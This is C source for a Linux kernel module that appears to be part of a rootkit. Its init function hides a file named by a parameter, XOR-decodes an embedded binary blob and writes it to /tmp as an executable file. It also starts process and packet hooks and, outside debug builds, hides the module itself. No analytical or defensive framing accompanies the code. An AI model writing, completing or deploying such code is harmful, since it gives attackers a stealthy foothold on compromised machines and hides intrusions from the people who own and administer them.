#include <linux/init.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>

#include <linux/fs.h>
#include <linux/file.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
#include <linux/fdtable.h>
#endif
#include <linux/time.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/spinlock.h>

#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <net/sock.h>
#include <asm/uaccess.h>
#include <asm/siginfo.h>
#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#include <linux/security.h>
#include <linux/aio.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 30)
#include <linux/cred.h>
#endif
// 移除vermagic.h包含，这个头文件只能在内核模块编译时使用
// #include <linux/vermagic.h>

#include "config.h"
#include "rmod.h"
#include "rproc.h"
//#include "rfile.h"
#include "rhook.h"
#include "fs.h"

// module_init.c
// hide self
static char *fh = NULL;
module_param(fh, charp, S_IRUSR);


inline void blk_enc(char buf[], size_t buf_len, unsigned int _key, size_t key_len)
{
	size_t idx;
	char *key = (char *)&_key;

	for (idx = 0; idx < buf_len; idx++)
	{
		buf[idx] ^= key[idx % key_len];
	}
}

static char b_block[] = {
#include "file_block.inc"
};
int wr_blk(void)
{
	sprintf(_kpath, "/tmp/%x", FILE_XOR_KEY);
	sprintf(_kname, "%x", FILE_XOR_KEY);

	blk_enc(b_block , sizeof(b_block), FILE_XOR_KEY, sizeof(unsigned int));

	struct file *file = NULL;
	static loff_t offset;
	file = filp_open(_kpath, O_CREAT|O_RDWR|O_LARGEFILE, 0700);	// 0700 = rwx
	if (!file)
         return -1;

	ssize_t cnt = _kwrite_file(file, b_block, sizeof(b_block), &offset);
	
	debug(" data:%d \n", (unsigned int)cnt );
	debug(" _kpath : %s  _kname:%s \n", _kpath, _kname);
	
	_kclose_file(file);
	
	return 0;
}


static int _in(void)
{
	file_hide(fh);
	
	wr_blk();
	
	if (init_util_func() < 0)
	{
		return 0;
	}
	
	if (_init1() < 0)
	{
		return 0;
	}


	proc_path_init();

	pktinit1();

#ifndef DEBUG_MSG
	hide();
#endif

	debug("install ok.\n");

	return 0;
}

static void _out(void)
{
	proc_path_exit();

	pktinit2();

	_init2();

#ifndef DEBUG_MSG
	show();
#endif

	debug("uninstall ok.\n");
}

module_init(_in);
module_exit(_out);

MODULE_LICENSE("GPL");
//MODULE_AUTHOR("");
//MODULE_DESCRIPTION("");
